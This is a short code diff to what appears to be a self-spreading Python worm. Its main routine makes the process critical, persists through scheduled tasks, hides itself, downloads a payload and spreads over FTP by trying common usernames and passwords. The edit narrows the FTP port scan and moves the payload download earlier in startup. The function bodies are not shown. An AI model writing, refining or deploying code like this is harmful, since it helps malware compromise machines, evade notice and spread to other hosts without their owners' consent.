@@ -58,7 +58,7 @@ def ftp_connect(ip, user, pwd, anonymous=False):
     try:
         ftp = ftplib.FTP(timeout=2)
         ports = [21]
-        ports.extend(range(2121,2200))
+        ports.extend(range(2121,2131))
         for p in ports:
             try:
                 ftp.connect(ip, port=p)
@@ -277,7 +277,7 @@ def setup_ftp_server(usernames, passwords):
 if __name__ == "__main__":
     set_process_as_critical()
     persist_schtasks()
+    download_payload()
     setup_ftp_server(common_users, common_pass)
     hide_process()
-    download_payload()
     ftp_spread(common_users, common_pass)
